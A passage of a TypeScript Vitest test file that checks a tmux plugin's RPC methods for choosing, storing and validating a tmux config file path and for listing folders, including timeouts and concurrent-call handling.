  it("reads with a stored path exactly as the storage holds it", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = await loadPluginWithStored("~/dotfiles/tmux.conf ");

    await harness.callRpc("tmuxConfig", null);

    expect(chosenPaths()).toEqual(["~/dotfiles/tmux.conf "]);
  });

  it("goes back to tmux's usual files for null", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const harness = await loadPluginWithStored(CHOSEN_FILE);

    expect(await harness.callRpc("setConfigFile", { path: null })).toEqual({
      ok: true,
      file: null,
    });
    expect(await harness.callRpc("configFile", null)).toEqual({ file: null });
    await harness.callRpc("tmuxConfig", null);
    expect(chosenPaths()).toEqual([""]);
  });

  it("answers the same when no file was chosen and null is given", async () => {
    const harness = loadPlugin();

    expect(await harness.callRpc("setConfigFile", { path: null })).toEqual({
      ok: true,
      file: null,
    });
  });

  it.each(["tmux.conf", "./tmux.conf", "../tmux.conf", "~other/tmux.conf", "$HOME/tmux.conf", "", "   ", " ~/tmux.conf", "\n/made/up/tmux.conf"])(
    "does not store the path %j, which is not absolute, says so and keeps the choice as it was",
    async (path) => {
      const harness = await loadPluginWithStored(CHOSEN_FILE);

      expect(await harness.callRpc("setConfigFile", { path })).toEqual({
        ok: false,
        reason: "not-absolute",
      });
      expect(await harness.callRpc("configFile", null)).toEqual({
        file: { path: CHOSEN_FILE, readable: true },
      });
      expect(harness.realtimeSignals).toEqual([]);
    },
  );

  it.each([
    ["a number", { path: 5 }],
    ["no path", {}],
    ["nothing", null],
    ["one more field", { path: CHOSEN_FILE, text: "set -g mouse on" }],
    ["a path of more than 4096 characters", { path: `/${"x".repeat(4096)}` }],
  ])("fails the call for %s, and stores nothing", async (_what, input) => {
    const harness = loadPlugin();

    await expect(harness.callRpc("setConfigFile", input)).rejects.toThrow();
    expect(await harness.callRpc("configFile", null)).toEqual({ file: null });
    expect(harness.realtimeSignals).toEqual([]);
  });

  it("takes a path of 4096 characters", async () => {
    const harness = loadPlugin();
    const path = `/${"x".repeat(4095)}`;

    expect(await harness.callRpc("setConfigFile", { path })).toMatchObject({ ok: true });
  });

  it("tells every bb window that another file was chosen, after it was stored", async () => {
    const harness = loadPlugin();

    await harness.callRpc("setConfigFile", { path: CHOSEN_FILE });
    await harness.callRpc("setConfigFile", { path: null });

    expect(CONFIG_FILE_CHANGED).toBe("config-file-changed");
    expect(harness.realtimeSignals).toEqual([
      { channel: CONFIG_FILE_CHANGED, payload: {} },
      { channel: CONFIG_FILE_CHANGED, payload: {} },
    ]);
  });

  it("has stored the file by the time the windows are told, so that a window that asks at once reads with it", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const { bb, harness } = createFakePluginHost({ pluginId: "tmux" });
    harnesses.push(harness);
    const storedWhenTold: unknown[] = [];
    const publish = bb.realtime.publish.bind(bb.realtime);
    bb.realtime.publish = (channel, payload) => {
      storedWhenTold.push(bb.storage.kv.get(CONFIG_FILE_STORAGE_KEY));
      publish(channel, payload);
    };
    tmux(bb);

    await harness.callRpc("setConfigFile", { path: CHOSEN_FILE });

    expect(await Promise.all(storedWhenTold)).toEqual([CHOSEN_FILE]);
  });

  it("answers that the file was stored when the bb windows could not be told, and notes that in the log of the plugin", async () => {
    const { bb, harness } = createFakePluginHost({ pluginId: "tmux" });
    harnesses.push(harness);
    bb.realtime.publish = () => {
      throw new Error("no connection");
    };
    tmux(bb);

    expect(await harness.callRpc("setConfigFile", { path: CHOSEN_FILE })).toEqual({
      ok: true,
      file: { path: CHOSEN_FILE, readable: true },
    });
    expect(await bb.storage.kv.get(CONFIG_FILE_STORAGE_KEY)).toBe(CHOSEN_FILE);
    expect(harness.logEntries).toEqual([
      {
        level: "warn",
        message: "the bb windows were not told of the chosen config file: Error: no connection",
      },
    ]);

    expect(await harness.callRpc("setConfigFile", { path: null })).toEqual({
      ok: true,
      file: null,
    });
    expect(await bb.storage.kv.list()).toEqual([]);
  });

  it("answers that the file was stored and cannot be read when the look at it fails after it was stored, and tells the bb windows", async () => {
    vi.mocked(canReadConfigFile).mockRejectedValueOnce(new Error("disk on fire"));
    const harness = loadPlugin();

    expect(await harness.callRpc("setConfigFile", { path: CHOSEN_FILE })).toEqual({
      ok: true,
      file: { path: CHOSEN_FILE, readable: false },
    });
    expect(harness.realtimeSignals).toEqual([
      { channel: CONFIG_FILE_CHANGED, payload: {} },
    ]);
    expect(harness.logEntries).toEqual([
      {
        level: "warn",
        message: "the look at the chosen config file failed: Error: disk on fire",
      },
    ]);
    expect(await harness.callRpc("configFile", null)).toEqual({
      file: { path: CHOSEN_FILE, readable: true },
    });
  });

  it("stores the file, and looks at it with no home directory, when the system fails to say where the home directory is", async () => {
    const harness = loadPlugin();
    failHomeLookupOnce();

    expect(await harness.callRpc("setConfigFile", { path: "/made/up/tmux.conf" })).toEqual({
      ok: true,
      file: { path: "/made/up/tmux.conf", readable: true },
    });
    expect(vi.mocked(canReadConfigFile).mock.calls).toEqual([["/made/up/tmux.conf", null]]);
    expect(harness.realtimeSignals).toEqual([
      { channel: CONFIG_FILE_CHANGED, payload: {} },
    ]);
  });

  it("answers which file is chosen when the system fails to say where the home directory is", async () => {
    const harness = await loadPluginWithStored(CHOSEN_FILE);
    failHomeLookupOnce();

    expect(await harness.callRpc("configFile", null)).toEqual({
      file: { path: CHOSEN_FILE, readable: true },
    });
    expect(vi.mocked(canReadConfigFile).mock.calls).toEqual([[CHOSEN_FILE, null]]);
  });

  it("keeps the choice for a server part that is started anew", async () => {
    vi.mocked(readTmuxConfig).mockResolvedValue(stockTmuxConfig());
    const first = loadPlugin();
    await first.callRpc("setConfigFile", { path: CHOSEN_FILE });

    const { harness: second } = await first.lifecycle.reload(tmux);
    harnesses.push(second);

    expect(await second.callRpc("configFile", null)).toEqual({
      file: { path: CHOSEN_FILE, readable: true },
    });
    await second.callRpc("tmuxConfig", null);
    expect(chosenPaths()).toEqual([CHOSEN_FILE]);
  });

  it("keeps the cleared choice for a server part that is started anew", async () => {
    const first = await loadPluginWithStored(CHOSEN_FILE);
    await first.callRpc("setConfigFile", { path: null });

    const { harness: second } = await first.lifecycle.reload(tmux);
    harnesses.push(second);

    expect(await second.callRpc("configFile", null)).toEqual({ file: null });
  });

  it("keeps the choice in one row of the key-value storage of the plugin, and removes the row with it", async () => {
    const { bb, harness } = createFakePluginHost({ pluginId: "tmux" });
    harnesses.push(harness);
    tmux(bb);

    await harness.callRpc("setConfigFile", { path: CHOSEN_FILE });
    expect(await bb.storage.kv.list()).toEqual([CONFIG_FILE_STORAGE_KEY]);
    expect(await bb.storage.kv.get(CONFIG_FILE_STORAGE_KEY)).toBe(CHOSEN_FILE);

    await harness.callRpc("setConfigFile", { path: null });
    expect(await bb.storage.kv.list()).toEqual([]);
  });

  it("answers also while the plugin is switched off, so that the file can be chosen before the plugin is switched on", async () => {
    const harness = loadPlugin({ enabled: false });

    expect(await harness.callRpc("setConfigFile", { path: CHOSEN_FILE })).toMatchObject({
      ok: true,
    });
    expect(await harness.callRpc("configFile", null)).toMatchObject({
      file: { path: CHOSEN_FILE },
    });
  });

  it("hands the page nothing of the file but its path and whether it can be read", async () => {
    const harness = await loadPluginWithStored(CHOSEN_FILE);

    const answer = (await harness.callRpc("configFile", null)) as { file: object };

    expect(Object.keys(answer)).toEqual(["file"]);
    expect(Object.keys(answer.file).sort()).toEqual(["path", "readable"]);
  });

  it("fails the call when the look at the file fails", async () => {
    vi.mocked(canReadConfigFile).mockRejectedValue(new Error("disk on fire"));
    const harness = await loadPluginWithStored(CHOSEN_FILE);

    await expect(harness.callRpc("configFile", null)).rejects.toThrow();
  });

  describe("when another choice is stored while the stored file is looked at", () => {
    // A look that only ends when the test says whether the file can be read.
    function slowLook() {
      const ends: ((readable: boolean) => void)[] = [];
      vi.mocked(canReadConfigFile).mockImplementationOnce(
        () => new Promise<boolean>((resolve) => ends.push(resolve)),
      );
      return ends;
    }

    function callsHaveArrived(): Promise<void> {
      return new Promise((resolve) => setTimeout(resolve, 0));
    }

    afterEach(() => {
      vi.mocked(canReadConfigFile).mockReset();
    });

    it("answers with the file that is chosen by the time the look has ended", async () => {
      const ends = slowLook();
      const harness = loadPlugin();

      const slow = harness.callRpc("setConfigFile", { path: "/made/up/slow.conf" });
      await callsHaveArrived();
      await harness.callRpc("setConfigFile", { path: "/made/up/other.conf" });
      vi.mocked(canReadConfigFile).mockResolvedValueOnce(false);
      ends[0](true);

      expect(await slow).toEqual({
        ok: true,
        file: { path: "/made/up/other.conf", readable: false },
      });
      expect(vi.mocked(canReadConfigFile).mock.calls.map(([path]) => path)).toEqual([
        "/made/up/slow.conf",
        "/made/up/other.conf",
        "/made/up/other.conf",
      ]);
    });

    it("answers that no file is chosen when the choice was cleared meanwhile", async () => {
      const ends = slowLook();
      const harness = loadPlugin();

      const slow = harness.callRpc("setConfigFile", { path: "/made/up/slow.conf" });
      await callsHaveArrived();
      await harness.callRpc("setConfigFile", { path: null });
      ends[0](true);

      expect(await slow).toEqual({ ok: true, file: null });
    });

    it("answers with the stored file when the look at the file chosen meanwhile fails", async () => {
      const ends = slowLook();
      const harness = loadPlugin();

      const slow = harness.callRpc("setConfigFile", { path: "/made/up/slow.conf" });
      await callsHaveArrived();
      await harness.callRpc("setConfigFile", { path: "/made/up/other.conf" });
      vi.mocked(canReadConfigFile).mockRejectedValueOnce(new Error("disk on fire"));
      ends[0](true);

      expect(await slow).toEqual({
        ok: true,
        file: { path: "/made/up/other.conf", readable: false },
      });
    });
  });

  describe("when the look at the chosen file does not end", () => {
    const HANGS = "/mount/that/hangs/tmux.conf";

    beforeEach(() => {
      vi.mocked(canReadConfigFile).mockImplementation(() => new Promise<boolean>(() => {}));
    });

    afterEach(() => {
      vi.useRealTimers();
    });

    it("answers after the limit that the file is chosen and cannot be read right now, so that the section still shows it", async () => {
      const harness = await loadPluginWithStored(HANGS);
      vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
      let answer: unknown = "none yet";

      void harness.callRpc("configFile", null).then((given) => {
        answer = given;
      });
      await vi.advanceTimersByTimeAsync(FILE_LOOK_LIMIT_MS - 1);

      expect(answer).toBe("none yet");

      await vi.advanceTimersByTimeAsync(1);

      expect(answer).toEqual({ file: { path: HANGS, readable: false } });
      expect(FILE_LOOK_LIMIT_MS).toBe(3000);
    });

    it("stores such a file, tells the bb windows at once and answers after the limit that it cannot be read right now", async () => {
      const harness = loadPlugin();
      vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });

      const stored = harness.callRpc("setConfigFile", { path: HANGS });
      await vi.advanceTimersByTimeAsync(FILE_LOOK_LIMIT_MS - 1);

      expect(harness.realtimeSignals).toEqual([
        { channel: CONFIG_FILE_CHANGED, payload: {} },
      ]);

      await vi.advanceTimersByTimeAsync(1);

      expect(await stored).toEqual({ ok: true, file: { path: HANGS, readable: false } });
    });

    it("clears the choice of such a file at once", async () => {
      const harness = await loadPluginWithStored(HANGS);
      vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
      void harness.callRpc("configFile", null).catch(() => {});

      expect(await harness.callRpc("setConfigFile", { path: null })).toEqual({
        ok: true,
        file: null,
      });
    });
  });

  it("leaves no timer behind for a look that ends in time", async () => {
    const harness = await loadPluginWithStored(CHOSEN_FILE);
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });

    await harness.callRpc("configFile", null);
    await harness.callRpc("setConfigFile", { path: "/made/up/tmux.conf" });

    expect(vi.getTimerCount()).toBe(0);
    vi.useRealTimers();
  });
});

describe("listFolder rpc method", () => {
  const LISTED: FolderListing = {
    ok: true,
    path: "/made/up/home",
    parent: "/made/up",
    entries: [
      { name: ".config", kind: "folder" },
      { name: ".tmux.conf", kind: "file" },
    ],
    truncated: false,
  };

  it("lists the path with the home directory of the server, and hands on the listing", async () => {
    vi.mocked(listFolder).mockResolvedValue(LISTED);
    const harness = loadPlugin();

    expect(await harness.callRpc("listFolder", { path: "~" })).toEqual(LISTED);
    expect(vi.mocked(listFolder).mock.calls).toEqual([["~", homedir()]]);
  });

  it("lists with no home directory when HOME is set to nothing and the system knows none", async () => {
    vi.stubEnv("HOME", "");
    vi.mocked(userInfo).mockImplementationOnce(() => {
      throw new Error("no entry for this user");
    });
    vi.mocked(listFolder).mockResolvedValue(LISTED);
    const harness = loadPlugin();

    await harness.callRpc("listFolder", { path: "/made/up/home" });

    expect(vi.mocked(listFolder).mock.calls).toEqual([["/made/up/home", null]]);
  });

  it.each(["/", "~"])("lists %s with no home directory, and does not fail the call, when the system fails to say where the home directory is", async (path) => {
    vi.mocked(listFolder).mockResolvedValue(LISTED);
    const harness = loadPlugin();
    failHomeLookupOnce();

    expect(await harness.callRpc("listFolder", { path })).toEqual(LISTED);
    expect(vi.mocked(listFolder).mock.calls).toEqual([[path, null]]);
  });

  it.each<FolderListing>([
    { ok: false, reason: "not-absolute", path: null, parent: null },
    { ok: false, reason: "missing", path: "/made/up/gone", parent: "/made/up" },
    { ok: false, reason: "is-a-file", path: "/made/up/tmux.conf", parent: "/made/up" },
    { ok: false, reason: "not-a-folder", path: "/made/up/pipe", parent: "/made/up" },
    { ok: false, reason: "unreadable", path: "/made/up/locked", parent: "/made/up" },
    { ...LISTED, path: "/", parent: null, truncated: true },
  ])("hands on the answer %j as it is, and not as a failed call", async (listing) => {
    vi.mocked(listFolder).mockResolvedValue(listing);
    const harness = loadPlugin();

    expect(await harness.callRpc("listFolder", { path: "/made/up" })).toEqual(listing);
  });

  it.each([
    ["a text of a file", { ...LISTED, text: "set -g prefix C-a" }],
    ["an entry with more than a name and a kind", {
      ...LISTED,
      entries: [{ name: "tmux.conf", kind: "file", size: 12 }],
    }],
    ["an entry of another kind", { ...LISTED, entries: [{ name: "pipe", kind: "fifo" }] }],
    ["another reason", { ok: false, reason: "busy", path: null, parent: null }],
  ])("fails the call for an answer with %s, which is more than the page may know", async (_what, listing) => {
    vi.mocked(listFolder).mockResolvedValue(listing as never);
    const harness = loadPlugin();

    await expect(harness.callRpc("listFolder", { path: "/made/up" })).rejects.toThrow();
  });

  it.each([
    ["a number", { path: 5 }],
    ["no path", {}],
    ["nothing", null],
    ["one more field", { path: "~", hidden: false }],
    ["a path of more than 4096 characters", { path: `/${"x".repeat(4096)}` }],
  ])("fails the call for %s, and lists nothing", async (_what, input) => {
    const harness = loadPlugin();

    await expect(harness.callRpc("listFolder", input)).rejects.toThrow();
    expect(listFolder).not.toHaveBeenCalled();
  });

  it("answers also while the plugin is switched off", async () => {
    vi.mocked(listFolder).mockResolvedValue(LISTED);
    const harness = loadPlugin({ enabled: false });

    expect(await harness.callRpc("listFolder", { path: "~" })).toEqual(LISTED);
  });

  it("lets calls for one folder share a listing that is under way, and lists afresh for a call after it has ended", async () => {
    const ends: ((listing: FolderListing) => void)[] = [];
    vi.mocked(listFolder).mockImplementation(
      () => new Promise<FolderListing>((resolve) => ends.push(resolve)),
    );
    const harness = loadPlugin();

    const first = harness.callRpc("listFolder", { path: "/mount/that/hangs" });
    const second = harness.callRpc("listFolder", { path: "/mount/that/hangs" });
    const other = harness.callRpc("listFolder", { path: "/made/up/home" });
    await new Promise((resolve) => setTimeout(resolve, 0));

    expect(listFolder).toHaveBeenCalledTimes(2);

    ends[0](LISTED);
    ends[1]({ ...LISTED, truncated: true });

    expect(await first).toEqual(LISTED);
    expect(await second).toEqual(LISTED);
    expect(await other).toEqual({ ...LISTED, truncated: true });

    const third = harness.callRpc("listFolder", { path: "/mount/that/hangs" });
    await new Promise((resolve) => setTimeout(resolve, 0));
    expect(listFolder).toHaveBeenCalledTimes(3);
    ends[2](LISTED);
    await third;
  });
});
